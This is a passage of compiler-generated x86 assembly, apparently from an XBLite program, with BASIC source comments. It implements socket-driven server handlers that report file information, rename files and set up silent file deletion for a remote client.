#define ClientFileInfo.tsize ebp-52	; exposes local variable 'tsize'
;
;
; [1955] FSIZE fsize
#ifdef ClientFileInfo.fsize
#undef ClientFileInfo.fsize
#endif
#define ClientFileInfo.fsize ebp-56	; exposes local variable 'fsize'
;
;
; [1958] IFZ filename THEN RETURN
	mov	eax,[ebp+12]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.266			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00C0.server			;;; i192
A.266:
	xor	eax,eax			;;; i862
	jmp	end.func3F.server			;;; i258
else.00C0.server:
end.if.00C0.server:
;
; [1959] IF RIGHT$(filename,1) == "\\" THEN
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.02CD.server			;;; i663
	call	%_string.compare.sv			;;; i690
	jne	>> else.00C1.server			;;; i219
;
; [1960] p = RINSTR (filename,"\\")
#ifdef ClientFileInfo.p
#undef ClientFileInfo.p
#endif
#define ClientFileInfo.p ebp-60	; exposes local variable 'p'
;
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,addr @_string.02CD.server			;;; i663
	mov	d[esp+4],eax			;;; i887
	mov	d[esp+8],0			;;; i571
	call	%_rinstr.vv			;;; i572
	add	esp,64			;;; i600
	mov	d[ebp-60],eax			;;; i670
;
; [1961] filename = LEFT$(filename,p-1)
	sub	esp,64			;;; i487
	mov	eax,[ebp+12]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	eax,d[ebp-60]			;;; i665
	sub	eax,1			;;; i791
	mov	d[esp+4],eax			;;; i887
	call	%_left.d.v			;;; i578
	add	esp,64			;;; i600
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1962] END IF
else.00C1.server:
end.if.00C1.server:
;
; [1964] h = FindFirstFileA (&filename,&wfd)
#ifdef ClientFileInfo.h
#undef ClientFileInfo.h
#endif
#define ClientFileInfo.h ebp-64	; exposes local variable 'h'
;
;
; [0] EXTERNAL FUNCTION FindFirstFileA (lpFileName, lpFindFileData)
	mov	eax,d[ebp+12]			;;; i642
; .xstk3F.0000 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp-72]			;;; i674a
	call	_FindFirstFileA@8			;;; i619
	mov	d[ebp-64],eax			;;; i670
;
; [1965] IF (h == $$INVALID_HANDLE_VALUE) THEN
	mov	eax,d[ebp-64]			;;; i665
	cmp	eax,-1			;;; i684a
	jne	>> else.00C2.server			;;; i219
;
; [1966] SendMsg (socket,"CMSG --- properties error: "+filename+"\1\2--- "+GetLastErrorStr())
	mov	eax,addr @_string.03FA.server			;;; i663
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03FB.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-72],eax			;;; i670
	call	func20.server			;;; i619
	mov	ebx,[ebp-72]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1967] RETURN
	xor	eax,eax			;;; i862
	jmp	end.func3F.server			;;; i258
;
; [1968] ELSE
	jmp	end.if.00C2.server			;;; i107
else.00C2.server:
;
; [1969] FindClose (h)
;
; [0] EXTERNAL FUNCTION FindClose (hFindFile)
	push	[ebp-64]			;;; i674a
	call	_FindClose@4			;;; i619
;
; [1970] END IF
end.if.00C2.server:
;
; [1972] IF (wfd.dwFileAttributes & $$FILE_ATTRIBUTE_DIRECTORY) THEN
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax]			;;; i313b
	and	eax,16			;;; i769
	test	eax,eax			;;; i220
	jz	>> else.00C3.server			;;; i221
;
; [1973] tsize = GetDirSize (socket,"123 "+filename)
	mov	eax,addr @_string.03FE.server			;;; i663
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func76.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1974] filename = filename + "\\"
	mov	eax,[ebp+12]			;;; i665
	mov	ebx,addr @_string.02CD.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp+12]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1975] ELSE
	jmp	end.if.00C3.server			;;; i107
else.00C3.server:
;
; [1976] fsize.sizeh = wfd.nFileSizeHigh
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+28]			;;; i313b
	mov	ebx,d[ebp-56]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [1977] fsize.sizel = wfd.nFileSizeLow
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+32]			;;; i313b
	mov	ebx,d[ebp-56]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [1978] tsize = STRING$(fsize.tsize)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-56]			;;; i665
	mov	edx,d[eax+4]
	mov	eax,d[eax]			;;; i313b
	mov	d[esp],eax			;;; i885
	mov	d[esp+4],edx			;;; i886
	call	%_string.giant			;;; i576
	add	esp,64			;;; i600
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1979] END IF
end.if.00C3.server:
;
; [1981] fi = STRING$(wfd.dwFileAttributes)+" "
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_string.ulong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1982] fi = fi + tsize+" "
	mov	eax,[ebp-48]			;;; i665
	mov	ebx,[ebp-52]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1983] fi = fi + STRING$(wfd.ftCreationTime.dwLowDateTime)+" "
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_string.ulong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-48]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1984] fi = fi + STRING$(wfd.ftCreationTime.dwHighDateTime)+" "
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+8]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_string.ulong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-48]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1985] fi = fi + STRING$(wfd.ftLastWriteTime.dwLowDateTime)+" "
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+20]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_string.ulong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-48]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1986] fi = fi + STRING$(wfd.ftLastWriteTime.dwHighDateTime)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+24]			;;; i313b
	mov	d[esp],eax			;;; i887
	call	%_string.ulong			;;; i576
	add	esp,64			;;; i600
	mov	ebx,[ebp-48]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1987] SendMsg (socket,"FINFO "+filename+"|"+fi)
	mov	eax,addr @_string.0408.server			;;; i663
	mov	ebx,[ebp+12]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0409.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-48]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1989] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientFileInfo.server:  ;;; Function end label for Assembly Programmers.
end.func3F.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func3F.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func3F.server:
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientFileInfo ()  *****
;  *****
;
; [1991] FUNCTION ClientRenameFile (socket,STRING msg)
.code
;
#ifdef ClientRenameFile.socket
#undef ClientRenameFile.socket
#endif
#define ClientRenameFile.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientRenameFile.msg
#undef ClientRenameFile.msg
#endif
#define ClientRenameFile.msg ebp+12	; exposes function argument 'msg'
;
align 16
_ClientRenameFile.server@8:
;  *****
;  *****  FUNCTION  ClientRenameFile ()  *****
;  *****
func3D.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func3D.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.273:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.273			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
funcBody3D.server:
;
; [1992] STRING id,oldname,newname,dir
#ifdef ClientRenameFile.id
#undef ClientRenameFile.id
#endif
#define ClientRenameFile.id ebp-40	; exposes local variable 'id'
;
#ifdef ClientRenameFile.oldname
#undef ClientRenameFile.oldname
#endif
#define ClientRenameFile.oldname ebp-44	; exposes local variable 'oldname'
;
#ifdef ClientRenameFile.newname
#undef ClientRenameFile.newname
#endif
#define ClientRenameFile.newname ebp-48	; exposes local variable 'newname'
;
#ifdef ClientRenameFile.dir
#undef ClientRenameFile.dir
#endif
#define ClientRenameFile.dir ebp-52	; exposes local variable 'dir'
;
;
; [1993] STRING old,new,ftype
#ifdef ClientRenameFile.old
#undef ClientRenameFile.old
#endif
#define ClientRenameFile.old ebp-56	; exposes local variable 'old'
;
#ifdef ClientRenameFile.new
#undef ClientRenameFile.new
#endif
#define ClientRenameFile.new ebp-60	; exposes local variable 'new'
;
#ifdef ClientRenameFile.ftype
#undef ClientRenameFile.ftype
#endif
#define ClientRenameFile.ftype ebp-64	; exposes local variable 'ftype'
;
;
; [1996] id = GetTokenEx (@msg,32,0)' hItem
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1997] dir = GetTokenEx (@msg,'|',0)
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1998] oldname = GetTokenEx (@msg,'|',0)' file or folder to rename
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1999] newname = GetTokenEx (@msg,'|',0)' new name
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2000] old = dir+oldname
	mov	eax,[ebp-52]			;;; i665
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-56]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2001] new = dir+newname
	mov	eax,[ebp-52]			;;; i665
	mov	ebx,[ebp-48]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-60]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2003] IF RIGHT$(oldname,1) == "\\" THEN ftype = "folder" ELSE ftype = "file"
	sub	esp,64			;;; i487
	mov	eax,[ebp-44]			;;; i665
	mov	d[esp],eax			;;; i887
	mov	d[esp+4],1
	call	%_right.d.v			;;; i578
	add	esp,64			;;; i600
	mov	ebx,addr @_string.02CD.server			;;; i663
	call	%_string.compare.sv			;;; i690
	jne	>> else.00C4.server			;;; i219
	mov	eax,addr @_string.0414.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-64]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
	jmp	end.if.00C4.server			;;; i107
else.00C4.server:
	mov	eax,addr @_string.0415.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-64]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
end.if.00C4.server:
;
; [2004] IF MoveFileA (&old, &new) THEN
;
; [0] EXTERNAL FUNCTION MoveFileA (lpExistingFileName, lpNewFileName)
	mov	eax,d[ebp-56]			;;; i642
; .xstk3D.0000 = ebp-72	; internal variable
	mov	d[ebp-72],eax			;;; i670
	mov	eax,d[ebp-60]			;;; i642
	push	eax			;;; i667a
	push	[ebp-72]			;;; i674a
	call	_MoveFileA@8			;;; i619
	test	eax,eax			;;; i220
	jz	>> else.00C5.server			;;; i221
;
; [2005] SendMsg (socket,"CMSG --- "+ftype+" renamed: "+new)
	mov	eax,addr @_string.0416.server			;;; i663
	mov	ebx,[ebp-64]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0417.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-60]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2006] SendMsg (socket,"DIR "+id+" "+newname)
	mov	eax,addr @_string.0418.server			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-48]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2007] ELSE
	jmp	end.if.00C5.server			;;; i107
else.00C5.server:
;
; [2008] SendMsg (socket,"CMSG --- cannot rename "+ftype+": "+old+"\1\2--- "+GetLastErrorStr())
	mov	eax,addr @_string.0419.server			;;; i663
	mov	ebx,[ebp-64]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.041A.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-56]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.03FB.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	[ebp-72],eax			;;; i670
	call	func20.server			;;; i619
	mov	ebx,[ebp-72]			;;; i665
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	6			;;; i781g
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2009] SendMsg (socket,"DIR "+id+" "+oldname)
	mov	eax,addr @_string.0418.server			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[ebp-44]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [2010] END IF
end.if.00C5.server:
;
; [2012] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientRenameFile.server:  ;;; Function end label for Assembly Programmers.
end.func3D.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func3D.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.func3D.server:
	mov	esi,[ebp-60]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-48]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-52]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-64]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ClientRenameFile ()  *****
;  *****
;
; [2014] FUNCTION ClientDelFiles (socket,STRING msg)
.code
;
#ifdef ClientDelFiles.socket
#undef ClientDelFiles.socket
#endif
#define ClientDelFiles.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientDelFiles.msg
#undef ClientDelFiles.msg
#endif
#define ClientDelFiles.msg ebp+12	; exposes function argument 'msg'
;
align 16
_ClientDelFiles.server@8:
;  *****
;  *****  FUNCTION  ClientDelFiles ()  *****
;  *****
func3C.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func3C.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.277:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.277			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,176			;;; i114a
;
funcBody3C.server:
;
; [2015] STATIC SHFILEOPSTRUCT pFileOp
data section 'globals$statics'
align	4
%3C%pFileOp.server:	db 4 dup ?
.code
;
; [2016] STRING id,dir,fodir,name
#ifdef ClientDelFiles.id
#undef ClientDelFiles.id
#endif
#define ClientDelFiles.id ebp-40	; exposes local variable 'id'
;
#ifdef ClientDelFiles.dir
#undef ClientDelFiles.dir
#endif
#define ClientDelFiles.dir ebp-44	; exposes local variable 'dir'
;
#ifdef ClientDelFiles.fodir
#undef ClientDelFiles.fodir
#endif
#define ClientDelFiles.fodir ebp-48	; exposes local variable 'fodir'
;
#ifdef ClientDelFiles.name
#undef ClientDelFiles.name
#endif
#define ClientDelFiles.name ebp-52	; exposes local variable 'name'
;
;
; [2019] id = GetTokenEx (@msg,32,0)' hItem
	push	0			;;; i656a
	push	32			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2020] dir = GetTokenEx (@msg,'|',0)
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-44]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2021] name = GetTokenEx (@msg,'|',0)
	push	0			;;; i656a
	push	124			;;; i656a
	push	[ebp+12]			;;; i674a
	call	func10.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	[ebp+12],ecx			;;; i670
	lea	ebx,[ebp-52]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2022] IFZ name THEN RETURN
	mov	eax,[ebp-52]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.274			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.00C6.server			;;; i192
A.274:
	xor	eax,eax			;;; i862
	jmp	end.func3C.server			;;; i258
else.00C6.server:
end.if.00C6.server:
;
; [2024] fodir = dir+"\0\0"
	mov	eax,[ebp-44]			;;; i665
	mov	ebx,addr @_string.0422.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	lea	ebx,[ebp-48]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [2025] pfodir = &fodir
#ifdef ClientDelFiles.pfodir
#undef ClientDelFiles.pfodir
#endif
#define ClientDelFiles.pfodir ebp-56	; exposes local variable 'pfodir'
;
	mov	eax,d[ebp-48]			;;; i642
	mov	d[ebp-56],eax			;;; i670
;
; [2026] pFileOp.hwnd = ULONG(id)
	sub	esp,64			;;; i487
	mov	eax,[ebp-40]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.ulong.v			;;; i492a
	add	esp,64			;;; i600
	mov	ebx,d[%3C%pFileOp.server]			;;; i663a
	mov	d[ebx],eax			;;; i13b
;
; [2027] pFileOp.wFunc = $$FO_DELETE
	mov	eax,d[%3C%pFileOp.server]			;;; i663a
	mov	ebx,3			;;; i659
	mov	d[eax+4],ebx			;;; i13b
;
; [2028] pFileOp.pFrom = ULONG(pfodir)
	sub	esp,64			;;; i487
	mov	eax,d[ebp-56]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cv.xlong.to.ulong			;;; i492b
	add	esp,64			;;; i600
	mov	ebx,d[%3C%pFileOp.server]			;;; i663a
	mov	d[ebx+8],eax			;;; i13b
;
; [2029] pFileOp.pTo = 0
	mov	eax,d[%3C%pFileOp.server]			;;; i663a
	mov	ebx,0			;;; i659
	mov	d[eax+12],ebx			;;; i13b
;
; [2030] pFileOp.fFlags = $$FOF_NOCONFIRMATION | $$FOF_NOCONFIRMMKDIR | $$FOF_NOERRORUI | $$FOF_SILENT
	mov	eax,16			;;; i659
	or	eax,512			;;; i763
	or	eax,1024			;;; i763
